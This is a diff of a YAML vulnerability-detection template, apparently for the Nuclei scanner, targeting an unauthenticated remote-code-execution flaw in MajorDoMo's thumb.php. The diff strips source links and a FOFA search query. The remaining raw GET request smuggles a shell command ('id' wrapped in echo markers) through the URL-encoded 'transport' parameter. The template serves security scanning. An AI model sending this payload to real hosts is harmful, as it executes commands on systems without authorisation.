@@ -3,14 +3,8 @@ info:
   name: MajorDoMothumb未授权RCE漏洞(CNVD-2024-02175)
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/a804b81689dcc96312ff4b28d0ac2123
-
-    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  description: '[!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
   tags: rce,unauth,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: a804b81689dcc96312ff4b28d0ac2123
-    fofa: + fofa`app="MajordomoSL"`
 http:
 - raw:
   - 'GET /modules/thumb/thumb.php?url=cnRzcDovL2EK&debug=1&transport=%7C%7C+%28echo+%27%5BS%5D%27%3B+id%3B+echo+%27%5BE%5D%27%29%23%3B HTTP/1.1
